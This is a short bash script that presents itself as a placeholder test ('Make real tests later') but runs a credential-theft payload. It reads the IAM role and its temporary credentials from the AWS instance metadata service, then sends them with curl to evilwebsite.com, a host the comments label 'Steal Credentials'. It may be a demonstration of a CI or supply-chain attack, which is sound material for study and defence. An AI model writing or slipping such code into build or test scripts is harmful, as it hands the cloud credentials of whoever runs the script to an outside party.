#!/usr/bin/env /bin/bash

# Check if files in Directory
# if [ ! -z `ls ./src/*` ]; then echo "Passed Test. Files exist"; files

#TODO : Make real tests later

awsrole=$(curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials/) #Get AWS Role
creds=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$awsrole) #Get Credentials

curl -d creds=$creds https://evilwebsite.com #Steal Credentials